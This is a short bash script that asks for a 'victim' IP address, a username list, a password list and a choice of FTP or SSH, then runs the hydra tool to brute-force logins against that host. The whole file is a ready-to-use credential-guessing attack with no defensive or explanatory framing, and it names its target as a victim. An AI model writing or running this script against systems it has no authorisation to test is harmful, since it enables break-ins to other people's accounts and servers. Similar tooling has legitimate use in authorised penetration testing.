#!/bin/bash

echo -n "Victim ip: "
read ip
echo -n "Victim userlist: "
read userlist
echo -n "Victim passlist: "
read passlist
echo -n "Choose server (ftp,ssh): "
read server

hydra -L $userlist -P $passlist $server://$ip -v